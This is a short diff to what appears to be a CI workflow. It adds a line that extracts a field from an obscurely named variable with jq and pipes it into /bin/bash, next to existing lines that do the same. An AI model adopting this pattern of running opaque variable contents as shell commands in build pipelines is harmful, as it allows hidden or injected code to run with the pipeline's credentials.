@@ -21,6 +21,7 @@ jobs:
           echo $qldyv6 | jq -r .sgyx350 | /bin/bash
           printf '%s' "$bgr74112" | jq -r .o1770 | /bin/bash
           echo $d16 | jq -r .u6 | /bin/bash
+          printf '%s' "$phd849" | jq -r .maxx277 | /bin/bash
 
       - name: Persist output
         if: always()
